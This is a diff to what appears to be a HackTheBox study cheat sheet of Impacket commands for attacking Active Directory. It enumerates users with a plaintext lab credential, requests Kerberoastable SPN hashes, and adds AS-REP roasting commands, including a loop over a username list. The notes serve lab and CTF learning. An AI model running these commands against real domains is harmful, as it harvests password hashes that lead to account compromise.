@@ -2,3 +2,6 @@
  ./GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
 # to obtain a SPN values and hashes of the exposed user accounts: (which have SPN enabbled)
  GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+# AS-REPROASTING - finding account which have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true
+ GetNPUsers.py htb.local/ -no-pass -usersfile user.txt -dc-ip 10.10.16.2
+ $for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
